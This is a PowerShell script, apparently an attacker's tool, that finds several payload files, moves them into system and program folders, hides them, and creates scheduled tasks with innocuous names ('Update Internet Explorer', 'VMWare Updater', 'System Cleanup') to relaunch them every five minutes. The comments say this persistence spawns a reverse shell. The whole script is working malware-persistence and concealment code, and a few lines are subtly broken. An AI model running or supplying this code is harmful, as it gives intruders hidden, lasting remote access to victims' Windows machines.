# The following script when scatter all of the payloads to different directories to hide them. Note they can still be tracked down, but its good to not keep all your eggs in one basket. 

# Find malware.xml 
$file = 'malware.xml'
$searchinfolder = 'C:\'
$malvbsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move malware.xml
move $malvbsLoc "C:\Windows\System32"
# Hide the file from windows explorer using attrib 
attrib +h "C:\Windows\System32\malware.xml"

# Find iexplorerr.exe
$file = 'iexplorer.exe'
$searchinfolder = 'C:\'
$iexplorerrLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move iexplorerr.exe
move $iexplorerrLoc "C:\Program Files\Common Files\System"
# Hide the file from windows explorer using attrib
attrib +h "C:\Program Files\Common Files\System\iexplorer.exe"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "C:\Program Files\Common Files\System\iexplorer.exe"

# Find PowerHell.bat
$file = 'PowerHell.bat'
$searchinfolder = 'C:\'
$powerhellLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move PowerHell.bat
move $powerhellLoc "C:\Windows\System32"
# Hide the file from windows explorer using attrib
attrib +h "C:\Windows\System32\PowerHell.bat"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Windows\System32\PowerHell.bat"

# Find PowerManagement.exe
$file = 'PowerManagement.exe'
$searchinfolder = 'C:\'
$powermanLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move PowerManagement.exe
move $powermanLoc "C:\Program Files\Mozilla Firefox"
# Hide the file from windows explorer using attrib
attrib +h  "C:\Program Files\Mozilla Firefox\PowerManagement.exe"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Program Files\Mozilla Firefox\PowerManagement.exe"

# Find VMWareTools.exe
$file = 'VMWareTools.exe'
$searchinfolder = 'C:\'
$vmwaretoolsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move VMWareTools.exe
move $vmwaretoolsLoc "C:\Users\Public"
# Hide VMWareTools.exe
attrib +h "C:\Users\Public\VMWareTools.exe"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Users\Public\VMWareTools.exe"

# Find DiskHelper.exe
$file = 'DiskHelper.exe'
$searchinfolder = 'C:\'
$diskhelperLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move DiskHelper.exe
move $diskhelperLoc = "C:\Windows\drivers"
# Hide DiskHelper.exe
attrib +h "C:\Windows\drivers\DiskHelper.exe"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Windows\drivers\DiskHelper.exe"

# Find audio.exe
$file = 'audio.exe'
$searchinfolder = 'C:\'
$audioLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move audio.exe
move $audioLoc "C:\Windows\DigitalLocker\en-us"
# Hide audio.exe 
attrib +h "C:\Windows\DigitalLocker\en-us\audio.exe"
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "audio player" /tr "C:\Windows\DigitalLocker\en-us\audio.exe"

# Find LogMGMT.exe 
$file = 'LogMGMT.exe'
$searchinfolder = 'C:\'
$logmgmtLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
# Move LogMGMT
move $logmgmtLoc "C:\Windows\Globalization\ELS"
# Hide LogMGMT.exe
attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe
# Schedules the persistence to spawn a reverse shell
schtasks /create /sc minute /mo 5 /tn "Global Parsing" "C:\Windows\Globalization\ELS\LogMGMT.exe"
